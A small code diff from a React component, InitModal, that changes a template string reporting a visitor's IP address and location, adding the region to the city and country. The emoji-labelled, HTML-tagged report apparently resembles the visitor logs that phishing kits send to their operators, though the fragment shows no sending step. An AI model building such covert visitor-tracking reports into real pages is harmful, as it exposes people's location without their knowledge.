@@ -100,7 +100,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 ${
     geoInfo
         ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
-<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
+<b>📍 Location:</b> <code>${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}</code>`
         : 'N/A'
 }
 
